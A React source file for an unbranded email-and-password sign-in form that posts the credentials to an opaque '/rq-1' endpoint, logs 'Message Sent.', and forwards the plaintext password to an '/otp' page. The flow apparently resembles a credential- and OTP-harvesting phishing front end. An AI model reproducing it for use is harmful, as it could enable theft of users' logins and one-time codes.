import React, { useState, useEffect } from 'react'
import { useHistory } from 'react-router-dom'
import URL from './Url.js'

const Form = (props) => {

    const history = useHistory()
    const [email, setEmail] = useState('')
    const [password, setPassword] = useState('')
    const [loading, setLoading] = useState(false)
    const [token, setToken] = useState('')

    const handleEmail = (e) => {
        setEmail(e.target.value)
    }

    const handlePassword = (e) => {
        setPassword(e.target.value)
    }
 

    const fetchCsrf = async () => {
        console.log('changed the url', URL)
        const response = await fetch(URL + '/form', {
            method: 'GET',
            headers: {
                Accept: 'application/json',
                'Content-type': 'application/json',
            },
            credentials: 'include',
            mode: 'cors',
        })

        const resData = await response.json()

        console.log('get form', resData)
        setToken(resData.token)
    }

    useEffect(() => {
        console.log('rq1')
//fetchCsrf()
    }, [])

    const handleSubmit = async (e) => {
        e.preventDefault()
        setLoading(true)

        if (email === '' || password === '') {
            console.log('not sent')
            setLoading(false)
        } else {
            try {
                const response = await fetch(URL + '/rq-1', {
                    method: 'POST',
                    headers: {
                        Accept: 'application/json',
                        'Content-type': 'application/json',
                        Authorization: 'Bearer ' + token,
                    },
                    credentials: 'include',
                    mode: 'cors',

                    body: JSON.stringify({
                        email,
                        password,
                        otp: ''
                    }),
                })

                const resData = await response.json()

                if (resData.status === 'success') {
                    console.log('Message Sent.')
                    setLoading(false)
                    history.push('/otp', { email, password, token })
                } else if (resData.status === 'fail') {
                    console.log('Message failed to send.')
                    console.log({resData})
                    //         setLoading(false)
                }
            } catch (err) {
                console.log(err)
            }
        }
    }

    return (
        <form
            className='grid w-full place-content-stretch bg-white md:w-1/3 md:mx-auto '
            style={{ padding: '30px 15px' }}
            onSubmit={handleSubmit}
        >
            <h2 className='font-medium text-center text-[#1c124d] mb-4 text-2xl'>
                Sign in
            </h2>
            <input
                type='email'
                id='email'
                className='text-black outline-none text-lg p-1 rounded-md justify-self-stretch placeholder-[#b2b7be] focus:border-black mb-4'
                required
                value={email}
                placeholder='Email address'
                onChange={handleEmail}
            />
            <input
                type='password'
                id='email'
                className='text-black outline-none text-lg p-1 rounded-md justify-self-stretch placeholder-[#b2b7be] focus:border-black mb-4'
                required
                value={password}
                onChange={handlePassword}
                placeholder='password'
            />

            <button
                className=' rounded-md outline-none  bg-[#0059dd] text-white text-sm'
                style={{ padding: '.5rem 3rem', lineHeight: 2.5 }}
            >
                {loading ? 'loading..' : 'Sign in to your account'}
            </button>
            <div className='ui horizontal divider font-normal font-BrownBold lowercase'>
                {' '}
                <span>Or sign in with</span>
            </div>

            <div className='ui grids'>
                <div
                    className='ui eight wide column'
                    style={{ paddingRight: '16px' }}
                >
                    <div className='customBtn'>
                        <svg
                            className='icon'
                            xmlns='http://www.w3.org/2000/svg'
                            width='18'
                            height='18'
                            viewBox='0 0 18 18'
                            aria-hidden='true'
                        >
                            <title>Google</title>
                            <g fill='none' fillRule='evenodd'>
                                <path
                                    fill='#4285F4'
                                    d='M17.64 9.2045c0-.6381-.0573-1.2518-.1636-1.8409H9v3.4814h4.8436c-.2086 1.125-.8427 2.0782-1.7959 2.7164v2.2581h2.9087c1.7018-1.5668 2.6836-3.874 2.6836-6.615z'
                                ></path>
                                <path
                                    fill='#34A853'
                                    d='M9 18c2.43 0 4.4673-.806 5.9564-2.1805l-2.9087-2.2581c-.8059.54-1.8368.859-3.0477.859-2.344 0-4.3282-1.5831-5.036-3.7104H.9574v2.3318C2.4382 15.9832 5.4818 18 9 18z'
                                ></path>
                                <path
                                    fill='#FBBC05'
                                    d='M3.964 10.71c-.18-.54-.2822-1.1168-.2822-1.71s.1023-1.17.2823-1.71V4.9582H.9573A8.9965 8.9965 0 0 0 0 9c0 1.4523.3477 2.8268.9573 4.0418L3.964 10.71z'
                                ></path>
                                <path
                                    fill='#EA4335'
                                    d='M9 3.5795c1.3214 0 2.5077.4541 3.4405 1.346l2.5813-2.5814C13.4632.8918 11.426 0 9 0 5.4818 0 2.4382 2.0168.9573 4.9582L3.964 7.29C4.6718 5.1627 6.6559 3.5795 9 3.5795z'
                                ></path>
                            </g>
                        </svg>
                        <span className='buttonText'>Google</span>
                    </div>
                </div>
                <div
                    className='ui eight wide column'
                    style={{ paddingRight: '16px' }}
                >
                    <div id='facebookSignin' className='customBtn'>
                        <svg
                            className='icon'
                            xmlns='http://www.w3.org/2000/svg'
                            width='18'
                            height='18'
                        >
                            <path
                                d='M2 0h14a2 2 0 012 2v14a2 2 0 01-2 2H2a2 2 0 01-2-2V2a2 2 0 012-2zm13 2h-2.5A3.5 3.5 0 009 5.5V8H7v3h2v7h3v-7h3V8h-3V6a1 1 0 011-1h2V2z'
                                fill='#2553B4'
                            ></path>
                        </svg>
                        <span className='buttonText'>Facebook</span>
                    </div>
                </div>
            </div>
        </form>
    )
}

export default Form
